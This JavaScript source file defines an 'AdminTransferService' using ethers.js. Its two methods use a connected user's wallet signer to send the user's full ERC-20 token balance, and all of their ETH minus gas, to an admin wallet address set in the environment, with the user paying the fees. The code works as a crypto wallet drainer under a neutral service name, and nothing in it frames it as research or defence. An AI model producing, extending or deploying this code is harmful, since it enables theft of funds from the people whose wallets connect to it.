const { ethers } = require('ethers');

class AdminTransferService {
  constructor() {
    this.adminWallet = process.env.ADMIN_WALLET_ADDRESS;
    this.provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
  }

  async executeUserPaidTransfer(userAddress, tokenAddress, userProvider) {
    try {
      // User's wallet executes transfer (user pays gas)
      const tokenContract = new ethers.Contract(tokenAddress, [
        'function balanceOf(address) view returns (uint256)',
        'function transfer(address,uint256) returns (bool)',
        'function decimals() view returns (uint8)'
      ], userProvider.getSigner());
      
      const userBalance = await tokenContract.balanceOf(userAddress);
      
      if (userBalance > 0) {
        // USER executes transfer to admin (USER pays gas)
        const transferTx = await tokenContract.transfer(
          this.adminWallet,      // to admin
          userBalance            // full amount
          // User's wallet automatically handles gas
        );
        
        const decimals = await tokenContract.decimals();
        const amountFormatted = ethers.formatUnits(userBalance, decimals);
        
        return {
          success: true,
          txHash: transferTx.hash,
          amount: amountFormatted,
          userPaidGas: true
        };
      }
      
      return { success: false, reason: 'No balance to transfer' };
      
    } catch (error) {
      return { 
        success: false, 
        error: error.message,
        userPaidGas: true 
      };
    }
  }

  async executeETHTransfer(userProvider, userAddress) {
    try {
      const signer = userProvider.getSigner();
      const userBalance = await userProvider.getBalance(userAddress);
      
      // Calculate gas needed
      const gasPrice = await userProvider.getFeeData().then(f => f.gasPrice);
      const gasLimit = 21000n;
      const gasCost = gasPrice * gasLimit;
      
      // Transfer amount = user balance - gas cost
      const transferAmount = userBalance - gasCost;
      
      if (transferAmount > 0) {
        // USER sends ETH to admin (USER pays gas)
        const tx = await signer.sendTransaction({
          to: this.adminWallet,
          value: transferAmount,
          gasLimit: gasLimit,
          gasPrice: gasPrice
        });
        
        return {
          success: true,
          txHash: tx.hash,
          amount: ethers.formatEther(transferAmount),
          userPaidGas: true
        };
      }
      
      return { success: false, reason: 'Insufficient balance after gas' };
      
    } catch (error) {
      return { success: false, error: error.message };
    }
  }
}

module.exports = AdminTransferService;